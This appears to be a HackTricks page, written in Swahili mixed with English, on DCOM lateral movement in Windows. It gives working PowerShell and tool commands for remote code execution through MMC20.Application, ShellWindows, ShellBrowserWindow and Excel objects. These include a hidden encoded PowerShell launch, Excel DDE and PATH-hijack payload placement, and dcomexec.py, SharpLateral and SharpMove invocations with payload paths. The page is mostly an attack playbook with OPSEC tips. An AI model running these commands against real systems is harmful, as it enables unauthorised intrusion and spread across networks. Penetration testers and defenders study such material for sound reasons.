# DCOM Exec

{{#include ../../banners/hacktricks-training.md}}

DCOM lateral movement ni ya kuvutia kwa sababu hutumia tena COM servers zilizopo zilizo wazi kupitia RPC/DCOM badala ya kuunda service au scheduled task. Kwa vitendo, hii maana yake muunganisho wa awali kwa kawaida huanza kwenye TCP/135 kisha huhamia kwenye high RPC ports zinazotolewa kwa dynamically.

## Prerequisites & Gotchas

- Kwa kawaida unahitaji local administrator context kwenye target na remote COM server lazima iruhusu remote launch/activation.
- Tangu **March 14, 2023**, Microsoft inatekeleza DCOM hardening kwa systems zinazoungwa mkono. Old clients zinazoomba low activation authentication level zinaweza kushindwa isipokuwa ziweke mazungumzo angalau `RPC_C_AUTHN_LEVEL_PKT_INTEGRITY`. Modern Windows clients kwa kawaida huinuliwa automatically, hivyo current tooling kawaida bado hufanya kazi.
- Manual au scripted DCOM execution kwa ujumla huhitaji TCP/135 pamoja na dynamic RPC port range ya target. Ikiwa unatumia `dcomexec.py` ya Impacket na unataka command output irudi, kwa kawaida pia unahitaji SMB access kwa `ADMIN$` (au share nyingine inayoweza kuandikwa/kusomwa).
- Ikiwa RPC/DCOM inafanya kazi lakini SMB imezuiwa, `dcomexec.py -nooutput` bado inaweza kuwa useful kwa blind execution.

Quick checks:
```bash
# Enumerate registered DCOM applications
Get-CimInstance Win32_DCOMApplication | Select-Object AppID, Name

# Useful to inspect firewall/RPC issues
Test-NetConnection -ComputerName 10.10.10.10 -Port 135
```
## MMC20.Application

**Kwa habari zaidi kuhusu mbinu hii angalia chapisho la awali kutoka [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)**

Distributed Component Object Model (DCOM) objects huleta uwezo wa kuvutia kwa mwingiliano unaotegemea network na objects. Microsoft hutoa nyaraka za kina kwa DCOM na Component Object Model (COM), zinazopatikana [hapa kwa DCOM](https://msdn.microsoft.com/en-us/library/cc226801.aspx) na [hapa kwa COM](<https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363(v=vs.85).aspx>). Orodha ya DCOM applications inaweza kupatikana kwa kutumia amri ya PowerShell:
```bash
Get-CimInstance Win32_DCOMApplication
```
The COM object, [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx), huwezesha kuandika script za operations za MMC snap-in. Hasa, object hii ina method ya `ExecuteShellCommand` chini ya `Document.ActiveView`. Taarifa zaidi kuhusu method hii inaweza kupatikana [hapa](<https://msdn.microsoft.com/en-us/library/aa815396(v=vs.85).aspx>). Iangalie ikiendeshwa:

Feature hii hurahisisha utekelezaji wa commands juu ya network kupitia DCOM application. Ili kuingiliana na DCOM kwa mbali kama admin, PowerShell inaweza kutumika kama ifuatavyo:
```bash
[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
```
Amri huu unaunganisha kwa programu ya DCOM na kurudisha instance ya kitu cha COM. Kisha method ya ExecuteShellCommand inaweza kuitwa ili execute process kwenye host ya mbali. Mchakato unahusisha hatua zifuatazo:

Check methods:
```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView | Get-Member
```
Pata RCE:
```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView.ExecuteShellCommand(
"cmd.exe",
$null,
"/c powershell -NoP -W Hidden -Enc <B64>",
"7"
)
```
Hojae hoja la mwisho ni mtindo wa dirisha. `7` huweka dirisha likiwa limepunguzwa ukubwa. Kitaalamu, utekelezaji unaotegemea MMC mara nyingi husababisha mchakato wa mbali `mmc.exe` kuanzisha payload yako, jambo ambalo ni tofauti na objects zinazotegemea Explorer hapa chini.

## ShellWindows & ShellBrowserWindow

**Kwa maelezo zaidi kuhusu technique hii angalia chapisho la awali [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**

Object ya **MMC20.Application** iligunduliwa kukosa "LaunchPermissions" za wazi, hivyo kuchukua permissions za kawaida zinazoruhusu Administrators access. Kwa maelezo zaidi, thread inaweza kuchunguzwa [hapa](https://twitter.com/tiraniddo/status/817532039771525120), na matumizi ya [@tiraniddo](https://twitter.com/tiraniddo)’s OleView .NET kwa ajili ya kuchuja objects zisizo na explicit Launch Permission yanapendekezwa.

Objects mbili maalum, `ShellBrowserWindow` na `ShellWindows`, ziliangaziwa kwa sababu ya kukosa Launch Permissions za wazi. Kutokuwepo kwa ingizo la `LaunchPermission` kwenye registry chini ya `HKCR:\AppID\{guid}` kunaashiria hakuna permissions za wazi.

Ikilinganishwa na `MMC20.Application`, objects hizi mara nyingi ni tulivu zaidi kutoka mtazamo wa OPSEC kwa sababu command kwa kawaida huishia kama child ya `explorer.exe` kwenye host ya mbali badala ya `mmc.exe`.

### ShellWindows

Kwa `ShellWindows`, ambayo haina ProgID, methods za .NET `Type.GetTypeFromCLSID` na `Activator.CreateInstance` hurahisisha object instantiation kwa kutumia AppID yake. Mchakato huu hutumia OleView .NET kupata CLSID ya `ShellWindows`. Mara baada ya kuinstantiwa, interaction inawezekana kupitia method ya `WindowsShell.Item`, na kusababisha method invocation kama `Document.Application.ShellExecute`.

Example PowerShell commands zilitolewa ili kuinstantiate object na kutekeleza commands kwa mbali:
```bash
# Example
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```
### ShellBrowserWindow

`ShellBrowserWindow` ni sawa, lakini unaweza kuiunda moja kwa moja kupitia CLSID yake na pivot hadi `Document.Application.ShellExecute`:
```bash
$com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", "10.10.10.10")
$obj = [System.Activator]::CreateInstance($com)
$obj.Document.Application.ShellExecute(
"cmd.exe",
"/c whoami > C:\\Windows\\Temp\\dcom.txt",
"C:\\Windows\\System32",
$null,
0
)
```
### Lateral Movement with Excel DCOM Objects

Lateral movement inaweza kufikiwa kwa kutumia vibaya DCOM Excel objects. Kwa taarifa za kina, ni vyema kusoma mazungumzo kuhusu kutumia Excel DDE kwa lateral movement kupitia DCOM katika [Cybereason's blog](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom).

Mradi wa Empire unatoa PowerShell script, ambayo inaonyesha matumizi ya Excel kwa remote code execution (RCE) kwa ku-manipulate DCOM objects. Hapa chini ni snippets kutoka kwenye script inayopatikana katika [Empire's GitHub repository](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1), zikionyesha mbinu tofauti za ku-abuse Excel kwa RCE:
```bash
# Detection of Office version
elseif ($Method -Match "DetectOffice") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$isx64 = [boolean]$obj.Application.ProductCode[21]
Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
# Registration of an XLL
elseif ($Method -Match "RegisterXLL") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$obj.Application.RegisterXLL("$DllPath")
}
# Execution of a command via Excel DDE
elseif ($Method -Match "ExcelDDE") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$Obj.DisplayAlerts = $false
$Obj.DDEInitiate("cmd", "/c $Command")
}
```
Utafiti wa hivi karibuni ulipanua eneo hili kwa `Excel.Application`'s `ActivateMicrosoftApp()` method. Wazo kuu ni kwamba Excel inaweza kujaribu kuzindua legacy Microsoft applications kama FoxPro, Schedule Plus, au Project kwa kutafuta system `PATH`. Ikiwa operator anaweza kuweka payload yenye mojawapo ya majina hayo yanayotarajiwa katika location inayoweza kuandikwa ambayo ni sehemu ya target's `PATH`, Excel itaitekeleza.

Requirements for this variation:

- Local admin on the target
- Excel installed on the target
- Ability to write a payload to a writable directory in the target's `PATH`

Practical example abusing the FoxPro lookup (`FOXPROW.exe`):
```bash
copy C:\Windows\System32\calc.exe \\192.168.52.100\c$\Users\victim\AppData\Local\Microsoft\WindowsApps\FOXPROW.exe
$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "192.168.52.100"))
$com.ActivateMicrosoftApp("5")
```
Ikiwa host ya kushambulia haina `Excel.Application` ProgID ya ndani iliyosajiliwa, anzisha object ya mbali kwa kutumia CLSID badala yake:
```bash
$com = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID("00020812-0000-0000-C000-000000000046", "192.168.52.100"))
$com.Application.ActivateMicrosoftApp("5")
```
Thamani zinazotumika vibaya kwa vitendo:

- `5` -> `FOXPROW.exe`
- `6` -> `WINPROJ.exe`
- `7` -> `SCHDPLUS.exe`

### Zana za Automation kwa Lateral Movement

Zana mbili zimeangaziwa kwa ajili ya ku-automate mbinu hizi:

- **Invoke-DCOM.ps1**: Skripti ya PowerShell iliyotolewa na project ya Empire ambayo hurahisisha uanzishaji wa mbinu tofauti za kutekeleza code kwenye mashine za mbali. Skripti hii inapatikana kwenye repository ya Empire GitHub.

- **SharpLateral**: Zana iliyoundwa kwa ajili ya kutekeleza code kwa mbali, ambayo inaweza kutumika kwa command:
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
- [SharpMove](https://github.com/0xthirteen/SharpMove):
```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```
## Zana za Kiotomatiki

- Hati ya Powershell [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) inaruhusu kwa urahisi kuendesha njia zote zilizoelezwa za kutekeleza code kwenye machines nyingine.
- Unaweza kutumia `dcomexec.py` ya Impacket kutekeleza amri kwenye systems za mbali kwa kutumia DCOM. Builds za sasa zina support `ShellWindows`, `ShellBrowserWindow`, na `MMC20`, na default ni `ShellWindows`.
```bash
dcomexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Pick the object explicitly
dcomexec.py -object MMC20 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Blind execution when SMB/output retrieval is not available
dcomexec.py -object ShellBrowserWindow -nooutput 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c calc.exe"
```
- Unaweza pia kutumia [**SharpLateral**](https://github.com/mertdas/SharpLateral):
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
- Unaweza pia kutumia [**SharpMove**](https://github.com/0xthirteen/SharpMove)
```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```
## Marejeo

- [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
- [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)
- [https://support.microsoft.com/en-us/topic/kb5004442-manage-changes-for-windows-dcom-server-security-feature-bypass-cve-2021-26414-f1400b52-c141-43d2-941e-37ed901c769c](https://support.microsoft.com/en-us/topic/kb5004442-manage-changes-for-windows-dcom-server-security-feature-bypass-cve-2021-26414-f1400b52-c141-43d2-941e-37ed901c769c)
- [https://specterops.io/blog/2023/10/30/lateral-movement-abuse-the-power-of-dcom-excel-application/](https://specterops.io/blog/2023/10/30/lateral-movement-abuse-the-power-of-dcom-excel-application/)

{{#include ../../banners/hacktricks-training.md}}
